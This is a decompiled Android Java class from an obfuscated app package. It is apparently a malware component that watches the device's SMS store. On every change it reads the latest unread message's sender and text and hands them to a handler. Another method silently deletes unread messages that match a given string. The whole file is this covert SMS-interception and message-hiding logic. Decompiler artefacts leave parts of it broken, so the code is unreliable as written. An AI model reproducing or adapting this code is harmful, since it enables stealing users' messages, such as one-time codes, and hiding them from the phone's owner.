package com.amaz.onib;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import bn.sdk.szwcsss.common.az.c.model.Cdo;
import com.umeng.analytics.a;
/* loaded from: classes.dex */
public class bc extends ContentObserver {

    /* renamed from: a  reason: collision with root package name */
    private Context f664a;
    private Handler b;
    private String d;
    private int g;
    private int c = -2;
    private int e = -1;
    private int f = -2;

    public bc(Context context, Handler handler) {
        super(handler);
        this.f664a = context;
        this.b = handler;
    }

    /* JADX WARN: Removed duplicated region for block: B:11:0x006d  */
    /* JADX WARN: Removed duplicated region for block: B:22:0x00a0  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public String a() {
        Cursor cursor;
        Cursor cursor2 = null;
        StringBuilder sb = new StringBuilder();
        try {
            try {
                cursor = this.f664a.getContentResolver().query(Utils.URL_CONTENT, new String[]{"_id", "address", a.z, "date", "type"}, "read = ?", new String[]{"0"}, "date desc");
            } catch (Throwable th) {
                th = th;
                if (0 != 0) {
                    cursor2.close();
                }
                throw th;
            }
        } catch (Exception e) {
            e = e;
            cursor = null;
        } catch (Throwable th2) {
            th = th2;
            if (0 != 0) {
            }
            throw th;
        }
        if (cursor != null) {
            try {
            } catch (Exception e2) {
                e = e2;
                bs.b("SQLiteException in inphone" + e.getMessage());
                if (cursor != null) {
                    cursor.close();
                }
                return sb.toString();
            }
            if (cursor.moveToFirst()) {
                int columnIndex = cursor.getColumnIndex("address");
                int columnIndex2 = cursor.getColumnIndex(a.z);
                this.d = cursor.getString(columnIndex);
                String string = cursor.getString(columnIndex2);
                this.e = cursor.getInt(cursor.getColumnIndex("_id"));
                sb.append(string);
                if (string == null) {
                }
                if (cursor != null) {
                    cursor.close();
                }
                return sb.toString();
            }
        }
        sb.append("no result!");
        if (cursor != null) {
        }
        return sb.toString();
    }

    /* JADX WARN: Removed duplicated region for block: B:26:0x0082  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public boolean a(Context context, String str) {
        Cursor cursor;
        boolean z;
        Cursor cursor2 = null;
        try {
            try {
                cursor = context.getContentResolver().query(Uri.parse(Cdo.g), null, "read=0", null, null);
                z = false;
                while (cursor != null) {
                    try {
                        if (!cursor.moveToNext()) {
                            break;
                        } else if (cursor.getString(cursor.getColumnIndex(a.z)).trim().equals(str)) {
                            int i = cursor.getInt(cursor.getColumnIndex("_id"));
                            this.c = context.getContentResolver().delete(Uri.parse(Cdo.e), "_id=" + i, null);
                            if (this.c == 0) {
                                this.f = i;
                            } else if (this.c == 1) {
                                z = true;
                            }
                        }
                    } catch (Exception e) {
                        e = e;
                        e.printStackTrace();
                        if (cursor != null) {
                            cursor.close();
                        }
                        return z;
                    }
                }
                if (cursor != null) {
                    cursor.close();
                }
            } catch (Throwable th) {
                th = th;
                if (0 != 0) {
                    cursor2.close();
                }
                throw th;
            }
        } catch (Exception e2) {
            e = e2;
            cursor = null;
            z = false;
        } catch (Throwable th2) {
            th = th2;
            if (0 != 0) {
            }
            throw th;
        }
        return z;
    }

    @Override // android.database.ContentObserver
    public void onChange(boolean z) {
        super.onChange(z);
        Message message = new Message();
        Bundle bundle = new Bundle();
        bundle.putString("sms_content", a());
        bundle.putString("phone_num", this.d);
        message.setData(bundle);
        if (this.g != this.e && this.f != this.e) {
            this.g = this.e;
            this.b.sendMessage(message);
        }
    }
}
